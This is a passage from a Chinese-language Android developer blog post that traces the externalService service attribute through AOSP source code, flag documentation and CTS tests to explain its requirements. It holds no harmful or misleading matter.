href=\"https://android.googlesource.com/platform/frameworks/base/+/b9a8666eb5504f022343fef9087135b7d937ddf8%5E%21/\">https://android.googlesource.com/platform/frameworks/base/+/b9a8666eb5504f022343fef9087135b7d937ddf8%5E%21/</a><br>Commit信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Add external services, a way to run isolated processes as a different package.</span><br><span class=\"line\"></span><br><span class=\"line\">This adds android:externalService boolean attribute to &lt;service&gt;. If that</span><br><span class=\"line\">attribute is true, then bindService() may be called with</span><br><span class=\"line\">BIND_EXTERNAL_SERVICE to create the new service process under the calling</span><br><span class=\"line\">package&#x27;s name and uid. The service will execute the code from the package in</span><br><span class=\"line\">which it is declared, but will appear to run as the calling application.</span><br><span class=\"line\"></span><br><span class=\"line\">External services may only be used if android:exported=&quot;false&quot; and</span><br><span class=\"line\">android:isolatedProcess=&quot;true&quot;.</span><br><span class=\"line\"></span><br><span class=\"line\">Bug: 22084679</span><br><span class=\"line\">Bug: 21643067</span><br><span class=\"line\">Change-Id: I3c3a5f0ef58738316c5efeab9044e43e09220d01</span><br></pre></td></tr></table></figure>\n\n<p>改动也不多，就这么几个文件：<br><img src=\"https://imgconvert.csdnimg.cn/20190410235236156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>其中最重要的逻辑就在ActiveServices当中，很长的方法，此处只保留关键新增部分：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> ServiceLookupResult <span class=\"title function_\">retrieveServiceLocked</span><span class=\"params\">(Intent service,</span></span><br><span class=\"line\"><span class=\"params\">        String resolvedType, String callingPackage, <span class=\"type\">int</span> callingPid, <span class=\"type\">int</span> callingUid, <span class=\"type\">int</span> userId,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">boolean</span> createIfNeeded, <span class=\"type\">boolean</span> callingFromFg, <span class=\"type\">boolean</span> isBindExternal,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">boolean</span> allowInstant)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">ServiceRecord</span> <span class=\"variable\">r</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">            <span class=\"type\">ComponentName</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(</span><br><span class=\"line\">                    sInfo.applicationInfo.packageName, sInfo.name);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((sInfo.flags &amp; ServiceInfo.FLAG_EXTERNAL_SERVICE) != <span class=\"number\">0</span>) &#123; <span class=\"comment\">// 先验证flag，即对应externalService属性是否为true</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (isBindExternal) &#123; <span class=\"comment\">// isBindExternal表示是否是通过BIND_EXTERNAL_SERVICE绑定服务</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!sInfo.exported) &#123;</span><br><span class=\"line\">                    \t<span class=\"comment\">// 你看，exported必须也是true，否则直接丢你一脸异常</span></span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE failed, &quot;</span> + name +</span><br><span class=\"line\">                                <span class=\"string\">&quot; is not exported&quot;</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((sInfo.flags &amp; ServiceInfo.FLAG_ISOLATED_PROCESS) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    \t<span class=\"comment\">// isolatedProcess也必须true</span></span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE failed, &quot;</span> + name +</span><br><span class=\"line\">                                <span class=\"string\">&quot; is not an isolatedProcess&quot;</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// Run the service under the calling package&#x27;s application.</span></span><br><span class=\"line\">                    <span class=\"comment\">// （这里是源码注释，即下面的代码就是如何让调用方App拥有这个外置Service）</span></span><br><span class=\"line\">                    <span class=\"type\">ApplicationInfo</span> <span class=\"variable\">aInfo</span> <span class=\"operator\">=</span> AppGlobals.getPackageManager().getApplicationInfo(</span><br><span class=\"line\">                            callingPackage, ActivityManagerService.STOCK_PM_FLAGS, userId);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (aInfo == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE failed, &quot;</span> +</span><br><span class=\"line\">                                <span class=\"string\">&quot;could not resolve client package &quot;</span> + callingPackage);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// 其实就是重新设置了一遍ServiceInfo，让此Service改名换姓</span></span><br><span class=\"line\">                    sInfo = <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceInfo</span>(sInfo);</span><br><span class=\"line\">                    sInfo.applicationInfo = <span class=\"keyword\">new</span> <span class=\"title class_\">ApplicationInfo</span>(sInfo.applicationInfo);</span><br><span class=\"line\">                    sInfo.applicationInfo.packageName = aInfo.packageName;</span><br><span class=\"line\">                    sInfo.applicationInfo.uid = aInfo.uid;</span><br><span class=\"line\">                    name = <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(aInfo.packageName, name.getClassName());</span><br><span class=\"line\">                    service.setComponent(name);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE required for &quot;</span> +</span><br><span class=\"line\">                            name);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (isBindExternal) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE failed, &quot;</span> + name +</span><br><span class=\"line\">                        <span class=\"string\">&quot; is not an externalService&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a>发现</h2><p>在AndroidManifest中声明Service时，偶然发现一个布尔类型的属性：<code>android:externalService</code><br>示例如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">service</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:externalService</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">...</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>如果minSDK小于24，会显示警告，很显然这是一个24以后的新东西。<br>先顾名思义一下，external的service，外置（外挂）的服务？它和 <code>android:exported</code> 以及 <code>android:isolatedProcess</code> 属性是什么关系？</p>\n<h2 id=\"初探\"><a href=\"#初探\" class=\"headerlink\" title=\"初探\"></a>初探</h2><p>先谷歌一下，再百度一下，无果。竟然没有一个人解释这是什么东西，这更加激发了我的好奇心。<br>马上去Android官网搜，搜到service标签的文档，心中窃喜：<br><a href=\"https://developer.android.com/guide/topics/manifest/service-element\">https://developer.android.com/guide/topics/manifest/service-element</a><br>翻完整个文档，发现居然也没有 <code>android:externalService</code> 的说明，难道是太新了忘了补充文档吗？<br>不过我们可以从中先复习一下 <code>android:exported</code> 以及 <code>android:isolatedProcess</code> 属性：</p>\n<h5 id=\"exported\"><a href=\"#exported\" class=\"headerlink\" title=\"exported\"></a>exported</h5><blockquote>\n<p>Whether or not components of other applications can invoke the service or interact with it — “true” if they can, and “false” if not. When the value is “false”, only components of the same application or applications with the same user ID can start the service or bind to it.<br>The default value depends on whether the service contains intent filters. The absence of any filters means that it can be invoked only by specifying its exact class name. This implies that the service is intended only for application-internal use (since others would not know the class name). So in this case, the default value is “false”. On the other hand, the presence of at least one filter implies that the service is intended for external use, so the default value is “true”.<br>This attribute is not the only way to limit the exposure of a service to other applications. You can also use a permission to limit the external entities that can interact with the service (see the <a href=\"https://developer.android.com/guide/topics/manifest/service-element.html#prmsn\">permission</a> attribute).</p>\n</blockquote>\n<p>其实这个属性大家也是耳熟能详了，从官网解释来看，主要就是限制该Service能否被其他应用调用。<br>同时，还特意解释了默认值的决定情况，即你不需要总是显式地声明此属性。</p>\n<ul>\n<li>如果service标签下没有添加任何intent-filter，那么就默认为false，即不对外暴露，因为这种情况下其他应用不知道你的Service类名，当然就只能内部调用了（我觉得谷歌这个解释有点牵强，因为即便你知道包名和类名，但exported为false的话，你也调不了）</li>\n<li>如果添加了至少一个能让外部调用的filter标签（比如action什么的），那么默认值就是true了。</li>\n</ul>\n<p>最后，还提醒了此属性不是唯一一种限制外部调用的途径，permission也可以。</p>\n<h5 id=\"isolatedProcess\"><a href=\"#isolatedProcess\" class=\"headerlink\" title=\"isolatedProcess\"></a>isolatedProcess</h5><blockquote>\n<p>If set to true, this service will run under a special process that is isolated from the rest of the system and has no permissions of its own. The only communication with it is through the Service API (binding and starting).</p>\n</blockquote>\n<p>这个比较简单，顾名思义也知道是让Service独立运行到一个特定进程中。</p>\n<h2 id=\"挖掘\"><a href=\"#挖掘\" class=\"headerlink\" title=\"挖掘\"></a>挖掘</h2><p>既然搜也搜不到，官网也藏着掖着，那就只能我们自己挖掘了。这怎么少得了Read the fucking code呢？<br>这就要从系统启动App并解析Manifest文件开始说起了，我们只简要地分析一下：<br>1、SystemServer进程启动<strong>PackageManagerService</strong>（PMS）服务；<br>2、PMS扫描文件目录的过程，会调用到<strong>scanPackageLI</strong>方法，此方法中会实例化<strong>PackageParser</strong>，这是关键；<br>3、PackageParser会解析Manifest中的各种标签，其中<strong>parseService</strong>便是解析service的。</p>\n<p>来看看parseService方法的代码，长得一匹，得精简一下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> Service <span class=\"title function_\">parseService</span><span class=\"params\">(Package owner, Resources res,</span></span><br><span class=\"line\"><span class=\"params\">        XmlResourceParser parser, <span class=\"type\">int</span> flags, String[] outError,</span></span><br><span class=\"line\"><span class=\"params\">        CachedComponentArgs cachedArgs)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> XmlPullParserException, IOException &#123;</span><br><span class=\"line\">    <span class=\"type\">TypedArray</span> <span class=\"variable\">sa</span> <span class=\"operator\">=</span> res.obtainAttributes(parser,</span><br><span class=\"line\">            com.android.internal.R.styleable.AndroidManifestService);</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">Service</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Service</span>(cachedArgs.mServiceArgs, <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceInfo</span>());</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// exported的解析</span></span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">setExported</span> <span class=\"operator\">=</span> sa.hasValue(</span><br><span class=\"line\">            com.android.internal.R.styleable.AndroidManifestService_exported);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (setExported) &#123;</span><br><span class=\"line\">        s.info.exported = sa.getBoolean(</span><br><span class=\"line\">                com.android.internal.R.styleable.AndroidManifestService_exported, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    s.info.flags = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// isolatedProcess的解析</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sa.getBoolean(</span><br><span class=\"line\">            com.android.internal.R.styleable.AndroidManifestService_isolatedProcess,</span><br><span class=\"line\">            <span class=\"literal\">false</span>)) &#123;</span><br><span class=\"line\">        s.info.flags |= ServiceInfo.FLAG_ISOLATED_PROCESS;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// externalService的解析看这里！</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sa.getBoolean(</span><br><span class=\"line\">            com.android.internal.R.styleable.AndroidManifestService_externalService,</span><br><span class=\"line\">            <span class=\"literal\">false</span>)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 等我们去看看这个FLAG的注释就知道是干啥的了</span></span><br><span class=\"line\">        s.info.flags |= ServiceInfo.FLAG_EXTERNAL_SERVICE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    sa.recycle();</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">outerDepth</span> <span class=\"operator\">=</span> parser.getDepth();</span><br><span class=\"line\">    <span class=\"type\">int</span> type;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((type=parser.next()) != XmlPullParser.END_DOCUMENT</span><br><span class=\"line\">           &amp;&amp; (type != XmlPullParser.END_TAG</span><br><span class=\"line\">                   || parser.getDepth() &gt; outerDepth)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (type == XmlPullParser.END_TAG || type == XmlPullParser.TEXT) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (parser.getName().equals(<span class=\"string\">&quot;intent-filter&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"type\">ServiceIntentInfo</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceIntentInfo</span>(s);</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            s.intents.add(intent); <span class=\"comment\">// 注意这里的intents集合</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (parser.getName().equals(<span class=\"string\">&quot;meta-data&quot;</span>)) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!setExported) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 这儿有个小发现，正好验证了我们上述的官方文档复习</span></span><br><span class=\"line\">        <span class=\"comment\">// 若开发者没有显式地设置exported属性，且intent-filter标签数量大于0时，exported自动就赋值为true了</span></span><br><span class=\"line\">        s.info.exported = s.intents.size() &gt; <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接着我打开了ServiceInfo文件，总算是找到了官方解释：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Bit in &#123;<span class=\"doctag\">@link</span> #flags&#125;: If set, the service can be bound and run in the</span></span><br><span class=\"line\"><span class=\"comment\"> * calling application&#x27;s package, rather than the package in which it is</span></span><br><span class=\"line\"><span class=\"comment\"> * declared.  Set from &#123;<span class=\"doctag\">@link</span> android.R.attr#externalService&#125; attribute.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">FLAG_EXTERNAL_SERVICE</span> <span class=\"operator\">=</span> <span class=\"number\">0x0004</span>;</span><br></pre></td></tr></table></figure>\n\n<p>顺便，我发现Context源码中也新增了一个bindService的flag：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Flag for &#123;<span class=\"doctag\">@link</span> #bindService&#125;: The service being bound is an</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> android.R.attr#isolatedProcess isolated&#125;,</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> android.R.attr#externalService external&#125; service.  This binds the service into the</span></span><br><span class=\"line\"><span class=\"comment\"> * calling application&#x27;s package, rather than the package in which the service is declared.</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * When using this flag, the code for the service being bound will execute under the calling</span></span><br><span class=\"line\"><span class=\"comment\"> * application&#x27;s package name and user ID.  Because the service must be an isolated process,</span></span><br><span class=\"line\"><span class=\"comment\"> * it will not have direct access to the application&#x27;s data, though.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * The purpose of this flag is to allow applications to provide services that are attributed</span></span><br><span class=\"line\"><span class=\"comment\"> * to the app using the service, rather than the application providing the service.</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">BIND_EXTERNAL_SERVICE</span> <span class=\"operator\">=</span> <span class=\"number\">0x80000000</span>;</span><br></pre></td></tr></table></figure>\n\n<p>结合这俩来看，就非常明白了。稍作总结一下：<br>1、声明externalService为true就是让该Service可以绑定并运行在调用方的App中，而不是在声明这个Service的App中，这和我们最开始猜测的外置服务之意相符；<br>2、注释还进一步说明，此Service还同时须要设置isolatedProcess为true；<br>3、此Service的业务代码会在调用方App的包名环境下执行，因为它已经是独立进程（isolated process）了，从声明它的App那儿离家出走，改名换姓；<br>4、当然，此Service不能直接访问调用方App的数据；<br>5、目的是想从概念上分离Service提供方和使用方这二者（这是我个人理解）。</p>\n<h2 id=\"再挖\"><a href=\"#再挖\" class=\"headerlink\" title=\"再挖\"></a>再挖</h2><p>经过上述初步挖掘，我们算是搞清楚了externalService这个属性的含义和作用，但依然有一些疑惑。比如：<br>具体使用一定要带BIND_EXTERNAL_SERVICE这个flag吗？<br>只把isolatedProcess和externalService设为true就能用了吗？</p>\n<p>要解决这些疑惑，有两个办法，一是自己去尝试，二是再次Read the fucking code！想不到吧？<br>先给出源码地址：<a href=\"https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice\">https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice</a><br>其实这是CTS测试用到的单元测试代码，我们可以从单元测试项来看看有哪些重要的注意点。<br>这里具体只需要关注 <a href=\"https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice/service/AndroidManifest.xml\">service&#x2F;AndroidManifest.xml</a> 和 <a href=\"https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice/src/android/externalservice/cts/ExternalServiceTest.java\">src&#x2F;ExternalServiceTest.java</a> 这两个文件即可。</p>\n<p>从单元测试的Manifest中我们可以了解到几种主要的失败情况：<br>1、没有把exported设成true：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">service</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.ExternalNonExportedService&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:isolatedProcess</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:externalService</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>就对应这个错误用例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** Tests that BIND_EXTERNAL_SERVICE requires that an externalService be exported. */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testFailBindExternalNonExported</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">    intent.setComponent(</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(sServicePackage, sServicePackage+<span class=\"string\">&quot;.ExternalNonExportedService&quot;</span>));</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        getContext().bindService(intent, mConnection,</span><br><span class=\"line\">                Context.BIND_AUTO_CREATE | Context.BIND_EXTERNAL_SERVICE);</span><br><span class=\"line\">        fail(<span class=\"string\">&quot;Should not be able to BIND_EXTERNAL_SERVICE to non-exported service&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (SecurityException e) &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>所以，exported也要同时设成true才行。</strong><br>2、没有把isolatedProcess设成true：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">service</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.ExternalNonIsolatedService&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:isolatedProcess</span>=<span class=\"string\">&quot;false&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:externalService</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>就对应此错误：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** Tests that BIND_EXTERNAL_SERVICE requires the service be an isolatedProcess. */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testFailBindExternalNonIsolated</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">        fail(<span class=\"string\">&quot;Should not be able to BIND_EXTERNAL_SERVICE to non-isolated service&quot;</span>);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3、<strong>没有用BIND_EXTERNAL_SERVICE进行绑定也是不行的</strong>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 